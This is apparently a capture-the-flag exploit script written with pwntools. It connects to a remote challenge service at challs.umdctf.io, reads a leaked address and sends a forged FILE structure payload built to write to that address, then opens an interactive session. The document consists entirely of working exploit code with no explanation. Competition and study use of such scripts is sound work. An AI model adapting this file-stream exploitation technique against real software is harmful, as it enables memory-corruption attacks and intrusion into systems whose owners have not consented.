from pwn import *
context.arch = 'amd64'

#p = process('aura')
p = remote("challs.umdctf.io", 31006)
p.recvuntil(b": ")
leak = int(p.recvline()[:-1],16)
fp = FileStructure()

payload = fp.read(leak, 0x10)
p.send(payload)
p.send(b'0'*16)

p.interactive()

